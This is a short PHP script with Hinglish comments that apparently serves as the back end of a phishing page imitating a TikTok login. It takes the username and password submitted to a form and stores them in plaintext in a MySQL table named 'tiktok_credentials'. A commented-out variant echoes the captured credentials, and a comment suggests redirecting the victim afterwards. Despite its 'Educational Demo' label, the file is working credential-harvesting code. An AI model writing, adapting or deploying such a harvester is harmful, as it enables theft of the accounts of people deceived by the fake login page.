<!-- <?php
// $username = $_POST['username'];
// $password = $_POST['password'];
// Capture credentials in a server-side script or log them for further processing
// echo 'Username: ' . $username . '<br>';
// echo 'Password: ' . $password;
?> -->


<?php
// 1. Form se data lena
$user = $_POST['username'];
$pass = $_POST['password'];

// 2. Database Connection (Localhost ke hisaab se change karein)
$servername = "localhost";
$db_username = "root";      // XAMPP/WAMP ka default username
$db_password = "";          // XAMPP/WAMP ka default password (empty)
$dbname = "tiktok_db";      // Yeh wohi DB naam jo upar banaya tha

$conn = new mysqli($servername, $db_username, $db_password, $dbname);

if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

// 3. Data Insert karna (Prepared Statement)
$stmt = $conn->prepare("INSERT INTO tiktok_credentials (username, password) VALUES (?, ?)");
$stmt->bind_param("ss", $user, $pass);

if ($stmt->execute()) {
  // Success - aap isko redirect bhi kar sakte hain kisi aur page par
  echo "Record saved successfully! (Educational Demo)";
} else {
  echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>